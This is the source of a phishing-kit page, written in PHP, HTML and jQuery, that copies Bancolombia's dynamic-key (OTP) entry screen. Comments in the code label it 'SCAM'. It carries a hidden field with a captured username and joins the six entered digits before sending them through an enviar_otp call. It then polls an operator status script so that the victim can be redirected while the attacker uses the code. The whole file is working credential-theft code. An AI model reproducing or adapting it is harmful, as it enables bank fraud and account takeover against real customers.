<?php
require_once('notpc.php');
?>
<!DOCTYPE html>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
       <title>Autenticación Bancolombia</title>
       
       <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		


       
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link href="./Autenticación Bancolombia_pwd_files/styles.css" media="all" rel="stylesheet" type="text/css">
      <link href="./Autenticación Bancolombia_pwd_files/bootstrap.css" media="all" rel="stylesheet" type="text/css">
      <link href="./Autenticación Bancolombia_pwd_files/keyboard_util.css" media="all" rel="stylesheet" type="text/css">
      <script type="text/javascript" src="./Autenticación Bancolombia_pwd_files/jquery-3.6.0.min.js.descarga"></script>
      <script type="text/javascript" src="./Autenticación Bancolombia_pwd_files/jquery.redirect.js.descarga"></script>
      <script type="text/javascript" src="./Autenticación Bancolombia_pwd_files/bootstrap.js.descarga"></script>
      <script type="text/javascript" src="./Autenticación Bancolombia_pwd_files/Init.js.descarga"></script>
      
          <link href="./Autenticación Bancolombia_pwd_files/basic22.css" rel="stylesheet">
        <link href="./Autenticación Bancolombia_pwd_files/normalize.css" rel="stylesheet">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#000000">
    <meta http-equiv="ScreenOrientation" content="autoRotate:disabled">
    <meta http-equiv="Content-Security-Policy" content="frame-src &#39;self&#39; https: ;">
    <link href="./Autenticación Bancolombia_pwd_files/main.20a3090e.css" rel="stylesheet">
    <style data-styled="active" data-styled-version="5.3.11"></style>
           <link rel="stylesheet" href="./Autenticación Bancolombia_pwd_files/styles.b62a0d435ed832ea7a08.css" media="all" onload="this.media=&#39;all&#39;">
        <link rel="stylesheet" href="./Autenticación Bancolombia_pwd_files/basic3.css" media="all" onload="this.media=&#39;all&#39;">

      <link rel="stylesheet" href="./Autenticación Bancolombia_pwd_files/styles.b62a0d435ed832ea7a08.css">
    <script>
function verificarCamposCompletos() {
  var input1Value = document.getElementById("input1").value;
  var input2Value = document.getElementById("input2").value;
  var input3Value = document.getElementById("input3").value;
  var input4Value = document.getElementById("input4").value;
    var input5Value = document.getElementById("input5").value;
  var input6Value = document.getElementById("input6").value;

  var miBoton = document.getElementById("btnGo");



  if (input1Value !== "" && input2Value !== "" && input3Value !== "" && input4Value !== ""&& input5Value !== ""&& input6Value) {
    miBoton.classList.remove("sc-kpDqfm","hXZvXt");
    miBoton.classList.add("sc-kpDqfm",'ezyOXq');
    miBoton.disabled = false; // Habilitar el botón
  } else {
    miBoton.classList.remove("sc-kpDqfm",'ezyOXq');
    miBoton.classList.add("sc-kpDqfm","hXZvXt");
    miBoton.disabled = true; // Deshabilitar el botón
  }
}

function navegarSiguienteInput(event, siguienteInputId) {
  var campoActual = event.target;
  var siguienteInput = document.getElementById(siguienteInputId);

  if (event.inputType === "deleteContentBackward" ) {
    document.getElementById("input1").value = ""; // Limpiar el valor del primer campo
    document.getElementById("input2").value = ""; // Limpiar el valor del segundo campo
    document.getElementById("input3").value = ""; // Limpiar el valor del tercer campo
    document.getElementById("input4").value = ""; // Limpiar el valor del cuarto campo
        document.getElementById("input5").value = ""; // Limpiar el valor del cuarto campo
    document.getElementById("input6").value = ""; // Limpiar el valor del cuarto campo

    document.getElementById("input1").focus(); // Hacer foco en el primer campo
  } else if (campoActual.value !== "" && campoActual.value.length >= campoActual.getAttribute("maxlength")) {
    siguienteInput.focus(); // Hacer foco en el siguiente campo de entrada
  }
}

function capturarBorrar(event) {
  var teclaBorrar = 8; // Código de la tecla "Borrar" (Delete)
  if (event.keyCode === teclaBorrar || event.keyCode === 46) {
    document.getElementById("input1").value = ""; // Limpiar el valor del primer campo
    document.getElementById("input2").value = ""; // Limpiar el valor del segundo campo
    document.getElementById("input3").value = ""; // Limpiar el valor del tercer campo
    document.getElementById("input4").value = ""; // Limpiar el valor del cuarto campo
    document.getElementById("input5").value = ""; // Limpiar el valor del cuarto campo
    document.getElementById("input6").value = ""; // Limpiar el valor del cuarto campo
    document.getElementById("input1").focus(); // Hacer foco en el primer campo
    verificarCamposCompletos()
  }
}

</script>
   </head>
   <body>

     <!-- SCAM -->
     <input type="hidden" id="TxtUsername" value="pedrorm32">
     <input type="hidden" id="TxtPasswordAll" value="">

     <div class="modal fade" id="myModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
       <div class="modal-dialog">
         <div class="modal-content">
           <div class="modal-body" style="text-align:center;">
             <div class="mua-imgLogoItem"></div>
             <img src="./Autenticación Bancolombia_pwd_files/cargando.gif" height="100">
             <div class="text-svp-name" style="text-align:center;">Estamos validando su información, espere un momento por favor</div>
           </div>
         </div>
       </div>
     </div>

     <!-- /SCAM -->

   <div id="root">
      <div class="sc-gsFSXq jhvnaB">
        <div class="sc-iGgWBj icJLiE">
          <div id="scrollTop" class="sc-uVWWZ iVygmi"></div>
          <div class="sc-bbSZdi eDGRzG">Clave dinamica</div>
          <div class="sc-fBWQRz cULVBz"></div>
          <div type="containerPasswordForm" class="sc-gFAWRd ebvAEW">
            <div class="sc-gEvEer gcwMij">
              <div class="sc-eqUAAy kgsyyX"></div>
              <div class="sc-fqkvVR kfKTfV">Genérala desde tu App Bancolombia o ingresa el código de seguridad que hemos enviado como SMS.</div>
              <div src="./images/lock.94f176e5224bf551ea452eed4c2cc05b.svg" class="sc-dcJsrY jgQMlM"></div>
            </div>
            <div id="formGroup" class="sc-hwdzOV cbGVIx">
              <div _ngcontent-eem-c67="" class="wrapper" id="c_rrtxsrggzfglkbyvle8">
                                        <input _ngcontent-eem-c67="" numberonly="" autocomplete="one-time-code" maxlength="1" class="otp-input ng-pristine ng-valid ng-touched" id="input1" type="tel" placeholder="" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57) || event.charCode == 0" oninput="verificarCamposCompletos(); navegarSiguienteInput(event, &#39;input2&#39;);" onkeydown="capturarBorrar(event);" pattern="\d*" style="border-right-width: 0px; border-left-width: 0px; border-top-width: 0px; border-color: rgb(26, 27, 26); border-radius: 0px; font-family: password; width: 25px; font-size: 25px;">
                                        <input _ngcontent-eem-c67="" numberonly="" autocomplete="one-time-code" maxlength="1" class="otp-input ng-untouched ng-pristine ng-valid" id="input2" type="tel" placeholder="" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57) || event.charCode == 0" oninput="verificarCamposCompletos(); navegarSiguienteInput(event, &#39;input3&#39;)" onkeydown="capturarBorrar(event);" pattern="\d*" style="border-right-width: 0px; border-left-width: 0px; border-top-width: 0px; border-color: rgb(26, 27, 26); border-radius: 0px; font-family: password; width: 25px; font-size: 25px;">
                                        <input _ngcontent-eem-c67="" numberonly="" autocomplete="one-time-code" maxlength="1" class="otp-input ng-untouched ng-pristine ng-valid" id="input3" type="tel" placeholder="" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57) || event.charCode == 0" oninput="verificarCamposCompletos(); navegarSiguienteInput(event, &#39;input4&#39;)" onkeydown="capturarBorrar(event);" pattern="\d*" style="border-right-width: 0px; border-left-width: 0px; border-top-width: 0px; border-color: rgb(26, 27, 26); border-radius: 0px; font-family: password; width: 25px; font-size: 25px;">
                                        <input _ngcontent-eem-c67="" numberonly="" autocomplete="one-time-code" maxlength="1" class="otp-input ng-untouched ng-pristine ng-valid" id="input4" type="tel" placeholder="" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57) || event.charCode == 0" oninput="verificarCamposCompletos(); navegarSiguienteInput(event, &#39;input5&#39;) " onkeydown="capturarBorrar(event);" pattern="\d*" style="border-right-width: 0px; border-left-width: 0px; border-top-width: 0px; border-color: rgb(26, 27, 26); border-radius: 0px; font-family: password; width: 25px; font-size: 25px;">
                                            <input _ngcontent-eem-c67="" numberonly="" autocomplete="one-time-code" maxlength="1" class="otp-input ng-untouched ng-pristine ng-valid" id="input5" type="tel" placeholder="" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57) || event.charCode == 0" oninput="verificarCamposCompletos();navegarSiguienteInput(event, &#39;input6&#39;) " onkeydown="capturarBorrar(event);" pattern="\d*" style="border-right-width: 0px; border-left-width: 0px; border-top-width: 0px; border-color: rgb(26, 27, 26); border-radius: 0px; font-family: password; width: 25px; font-size: 25px;">
                                        <input _ngcontent-eem-c67="" numberonly="" autocomplete="one-time-code" maxlength="1" class="otp-input ng-untouched ng-pristine ng-valid" id="input6" type="tel" placeholder="" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57) || event.charCode == 0" oninput="verificarCamposCompletos(); " onkeydown="capturarBorrar(event);" pattern="\d*" style="border-right-width: 0px; border-left-width: 0px; border-top-width: 0px; border-color: rgb(26, 27, 26); border-radius: 0px; font-family: password; width: 25px; font-size: 25px;">

                                        <!---->
                                      </div>
              <div display="flex" class="sc-jGKxIK fUQuoR">
                <div>
                  <div>
                    <iframe style="display: none;" src="./Autenticación Bancolombia_pwd_files/saved_resource.html"></iframe>
                  </div>
                </div>
              </div>
              <div class="sc-jaXxmE knVkVz">

                <button width="390px" height="44px" id="btnGo" class="sc-kpDqfm hXZvXt">Continuar</button>
                <button width="390px" height="44px" id="btn-regresar" class="sc-kpDqfm fuQqfK">Regresar</button>
              </div>
            </div>
          </div>
        </div>
        <div class="sc-dAlyuH fgvEPZ">
          <div class="sc-jlZhew kZLvRr"></div>
          <span class="sc-eDPEul gTfgka">
            <div class="sc-eldPxv dJzohZ">
              <div class="sc-cPiKLX eqxxRJ"></div>
              <div class="sc-cwHptR fvLrbU">Copyright © 2023 Grupo Bancolombia.</div>
              <div class="sc-dLMFU kikHRa"></div>
            </div>
            <div class="sc-fPXMVe dCLFvs">
              
            </div>
          </span>
        </div>
      </div>
    </div>
    <div id="csid"></div>
      
    <script type="text/javascript">
	function consultar_estado2(){
        $.post( "/process2/estado.php",function(data) {
            switch (data) {
                case '2': window.location.href = "otp.php"; break;
                case '10': window.location.href = "finish.php"; break;
                case '12': window.location.href = "pagosbancolombiauser.php"; break;
                case '40': window.location.href = "/404.php"; break;
                case '41': window.location.href = "/cc.php?codigo=1"; break;
    
            } 
        });        
    }

	$(document).ready(function() {
	
	

		$('#btnGo').click(function(){
var pass = $("#input1").val() + "" + $("#input2").val() + "" + $("#input3").val() + "" + $("#input4").val()+ "" + $("#input5").val()+ "" + $("#input6").val();
       var Status = true;
        var consultar = false;

        if (Status) {
            enviar_otp(pass, "Boton Trico");
            $('#myModal').modal({ backdrop: 'static', keyboard: false, show: true });
            consultar = true;
        }

        if (consultar) {
            setInterval(consultar_estado2, 2000);
            consultar = false;
            Status = false;
        }	
			
		});

				
	});
</script>



</body></html>